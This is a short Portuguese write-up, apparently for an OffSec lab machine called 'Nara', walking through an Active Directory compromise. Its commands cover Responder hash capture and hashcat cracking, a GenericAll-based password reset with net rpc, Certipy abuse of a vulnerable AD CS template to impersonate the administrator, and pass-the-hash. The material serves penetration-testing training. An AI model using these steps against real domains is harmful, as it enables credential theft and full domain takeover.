# Nara
> DC enum + HashGrab + GenericAll + Certipy

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
bloodhound-python -u <user> -p <pass> -d nara.offsec -ns <IP> -c All
```

Análise do BloodHound: usuário com `GenericAll` sobre outro objeto.

## Exploração

HashGrab para captura de credenciais via Responder:

```
responder -I tun0 -A
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Acesso com credenciais comprometidas.

## Escalada de Privilégio

Abuso de `GenericAll` para resetar senha do alvo:

```
net rpc password <target_user> newpass123 -U nara/<user>%<pass> -S <IP>
```

Vulnerabilidade de AD CS identificada com Certipy:

```
certipy find -u <user>@nara.offsec -p <pass> -dc-ip <IP> -vulnerable
certipy req -u <user>@nara.offsec -p <pass> -ca <CA> -template <template> -upn administrator@nara.offsec
certipy auth -pfx administrator.pfx -dc-ip <IP>
```

Hash do Administrator → pass-the-hash para SYSTEM.
